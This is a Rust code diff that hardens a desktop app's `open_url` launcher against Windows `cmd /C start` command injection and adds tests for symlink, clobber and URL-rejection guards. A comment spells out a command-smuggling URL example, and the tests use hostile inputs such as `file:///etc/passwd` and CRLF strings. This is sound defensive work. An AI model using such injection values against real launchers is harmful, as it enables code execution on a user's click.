@@ -104,20 +104,44 @@ pub fn reveal_path(path: String) -> Result<(), String> {
 }
 
 /// Open an http(s) URL in the user's default browser. Only web URLs are allowed —
-/// never `file://`, `javascript:`, etc. — since URLs can come from terminal output.
+/// never `file://`, `javascript:`, etc. — because these URLs come from TERMINAL
+/// OUTPUT: `URL_RE` (`src/lib/paths.ts`) linkifies every match, so anything an
+/// agent runs, or any file it prints, can put a clickable link on screen.
+///
+/// The launcher must never be a shell. `cmd /C start` re-parses `&`, `|`, `^`,
+/// `<`, `>` as command separators AND expands `%VAR%`, and Rust's `Command`
+/// quotes a Windows argument only when it contains a space or tab — so a
+/// space-free `http://ok.com&\\host\share\evil.exe` was appended raw and ran a
+/// second command on click. (Rust's CVE-2024-24576 batch escaping does not help:
+/// it fires only when the *program* is a `.bat`/`.cmd`, not when you invoke
+/// cmd.exe yourself.) `tauri_plugin_opener::open_url` goes through
+/// `ShellExecuteExW` instead — no shell, and it's a free function, so the plugin
+/// needs no registration or capability entry. `open`/`xdg-open` already receive
+/// the URL as a single argv element with no shell, so those arms are unchanged.
 #[tauri::command(async)]
 pub fn open_url(url: String) -> Result<(), String> {
     if !(url.starts_with("http://") || url.starts_with("https://")) {
         return Err("Refusing to open a non-http(s) URL.".into());
     }
-    use std::process::Command;
-    #[cfg(target_os = "macos")]
-    let spawned = Command::new("open").arg(&url).spawn();
+    // Defence in depth: control characters have no legitimate place in a URL and
+    // are what a line-splitting trick needs, and `URL_RE`'s `[^\s...]` class does
+    // NOT exclude them. `&` is deliberately NOT rejected — it is ordinary
+    // query-string syntax, no shell sees it any more, and rejecting it here would
+    // fail *silently*, since the click handler swallows the error.
+    if url.chars().any(char::is_control) {
+        return Err("Refusing to open a URL containing control characters.".into());
+    }
     #[cfg(target_os = "windows")]
-    let spawned = Command::new("cmd").args(["/C", "start", "", &url]).spawn();
-    #[cfg(all(unix, not(target_os = "macos")))]
-    let spawned = Command::new("xdg-open").arg(&url).spawn();
-    spawned.map(|_| ()).map_err(|e| e.to_string())
+    return tauri_plugin_opener::open_url(&url, None::<&str>).map_err(|e| e.to_string());
+    #[cfg(not(target_os = "windows"))]
+    {
+        use std::process::Command;
+        #[cfg(target_os = "macos")]
+        let spawned = Command::new("open").arg(&url).spawn();
+        #[cfg(all(unix, not(target_os = "macos")))]
+        let spawned = Command::new("xdg-open").arg(&url).spawn();
+        spawned.map(|_| ()).map_err(|e| e.to_string())
+    }
 }
 
 /// Rename / move a filesystem entry. Refuses to clobber an existing target.
@@ -221,6 +245,16 @@ pub fn read_file(path: String) -> Result<FileData, String> {
     })
 }
 
+/// The exact wording `write_file` uses to report a stale-mtime conflict.
+///
+/// This is a CROSS-LANGUAGE CONTRACT. `isDiskConflict` in `src/lib/api.ts` tests
+/// `/changed on disk/i` against it to decide whether a failed save is
+/// recoverable — that is what puts the Overwrite / Reload buttons on screen in
+/// `FileEditor.tsx` instead of a dead-end error. Reword this and that escape
+/// hatch silently disappears. Change both sides together; the test below and
+/// `src/lib/api.test.ts` are the tripwire.
+pub const CONFLICT_MSG: &str = "The file changed on disk since you opened it.";
+
 #[tauri::command(async)]
 pub fn write_file(
     path: String,
@@ -241,11 +275,130 @@ pub fn write_file(
     if let Some(expected) = expected_mtime {
         if let Ok(meta) = std::fs::metadata(&path) {
             if mtime_ms(&meta) > expected + 1.0 {
-                return Err("The file changed on disk since you opened it.".into());
+                return Err(CONFLICT_MSG.into());
             }
         }
     }
     std::fs::write(&path, &content).map_err(|e| e.to_string())?;
     let meta = std::fs::metadata(&path).map_err(|e| e.to_string())?;
     Ok(mtime_ms(&meta))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // These guards are the fixes for previously-reported hostile-repo findings,
+    // and until now each was signed off with "cargo check green" rather than a
+    // test that pins it. A refactor that dropped one would have passed CI.
+
+    #[test]
+    #[cfg(unix)] // CI runs ubuntu-22.04; Windows symlinks need Developer Mode.
+    fn refuses_to_write_through_a_symlink() {
+        let d = tempfile::tempdir().unwrap();
+        let target = d.path().join("outside.txt");
+        let link = d.path().join("NOTES.md");
+        std::fs::write(&target, "original").unwrap();
+        std::os::unix::fs::symlink(&target, &link).unwrap();
+
+        let r = write_file(link.to_string_lossy().into_owned(), "evil".into(), None);
+
+        assert!(r.is_err(), "a symlink leaf must be refused");
+        // The point of the guard: the file OUTSIDE the repo is untouched.
+        assert_eq!(std::fs::read_to_string(&target).unwrap(), "original");
+    }
+
+    #[test]
+    fn refuses_to_clobber_a_file_that_changed_on_disk() {
+        let d = tempfile::tempdir().unwrap();
+        let p = d.path().join("a.txt");
+        std::fs::write(&p, "on disk").unwrap();
+        // A baseline "from the epoch" is older than any real mtime, so the
+        // conflict branch fires deterministically — no sleeping, no flake.
+        let err = write_file(p.to_string_lossy().into_owned(), "mine".into(), Some(0.0)).unwrap_err();
+        assert_eq!(err, CONFLICT_MSG);
+        assert_eq!(std::fs::read_to_string(&p).unwrap(), "on disk", "refused save must not write");
+    }
+
+    // Mirrors src/lib/api.test.ts. If this fails, the frontend's
+    // `/changed on disk/i` no longer recognises our conflict error and the
+    // Overwrite/Reload recovery in FileEditor.tsx has become unreachable.
+    #[test]
+    fn conflict_message_matches_the_frontend_predicate() {
+        assert!(
+            CONFLICT_MSG.to_lowercase().contains("changed on disk"),
+            "src/lib/api.ts isDiskConflict tests /changed on disk/i against: {CONFLICT_MSG}"
+        );
+    }
+
+    #[test]
+    fn writes_and_reads_back_with_a_matching_mtime() {
+        let d = tempfile::tempdir().unwrap();
+        let p = d.path().join("a.txt").to_string_lossy().into_owned();
+        let mtime = write_file(p.clone(), "first".into(), None).unwrap();
+        assert!(mtime > 0.0);
+        let data = read_file(p.clone()).unwrap();
+        assert_eq!(data.content, "first");
+        // Saving against the mtime we just read is not a conflict.
+        assert!(write_file(p, "second".into(), Some(data.mtime)).is_ok());
+    }
+
+    #[test]
+    fn read_file_rejects_anything_that_is_not_a_regular_file() {
+        // A directory takes the same branch a FIFO/device would, with no
+        // platform-specific setup — an unhandled FIFO would block the read forever.
+        let d = tempfile::tempdir().unwrap();
+        assert!(read_file(d.path().to_string_lossy().into_owned()).is_err());
+    }
+
+    #[test]
+    fn read_file_rejects_oversized_binary_and_non_utf8_files() {
+        let d = tempfile::tempdir().unwrap();
+        let big = d.path().join("big.txt");
+        std::fs::write(&big, vec![b'a'; 2_000_001]).unwrap();
+        assert!(read_file(big.to_string_lossy().into_owned()).is_err(), "over the 2 MB cap");
+
+        let bin = d.path().join("bin.dat");
+        std::fs::write(&bin, [b'a', 0, b'b']).unwrap();
+        assert!(read_file(bin.to_string_lossy().into_owned()).is_err(), "NUL byte in the head");
+
+        // Invalid UTF-8 with NO NUL, so this reaches the UTF-8 branch rather
+        // than being caught earlier by the binary sniff. Lossy decoding here
+        // would corrupt the file on the next save.
+        let latin = d.path().join("latin1.txt");
+        std::fs::write(&latin, [0xFF, 0xFE, 0x41]).unwrap();
+        assert!(read_file(latin.to_string_lossy().into_owned()).is_err());
+    }
+
+    #[test]
+    fn create_and_rename_refuse_to_clobber() {
+        let d = tempfile::tempdir().unwrap();
+        let a = d.path().join("a.txt");
+        let b = d.path().join("b.txt");
+        std::fs::write(&a, "a").unwrap();
+        std::fs::write(&b, "b").unwrap();
+        assert!(create_path(a.to_string_lossy().into_owned(), false).is_err());
+        assert!(rename_path(a.to_string_lossy().into_owned(), b.to_string_lossy().into_owned()).is_err());
+        assert_eq!(std::fs::read_to_string(&b).unwrap(), "b", "target must survive");
+    }
+
+    // Pins the fix for the Windows `cmd /C start` injection: these URLs come
+    // from terminal output, so the rejection branches matter. Only rejections
+    // are tested — a success case would spawn a real browser on the CI runner.
+    #[test]
+    fn open_url_rejects_non_web_schemes_and_control_characters() {
+        for bad in ["file:///etc/passwd", "javascript:alert(1)", "ftp://x/y", ""] {
+            assert!(open_url(bad.into()).is_err(), "must refuse {bad:?}");
+        }
+        assert!(open_url("http://ok.com/\r\nX".into()).is_err(), "control chars");
+        assert!(open_url("http://ok.com/\u{0}".into()).is_err(), "NUL");
+    }
+
+    #[test]
+    fn basename_handles_both_separators() {
+        assert_eq!(basename("/a/b/c.txt"), "c.txt");
+        assert_eq!(basename("C:\\a\\b.txt"), "b.txt");
+        assert_eq!(basename("/a/b/"), "b");
+        assert_eq!(basename("bare"), "bare");
+    }
 }
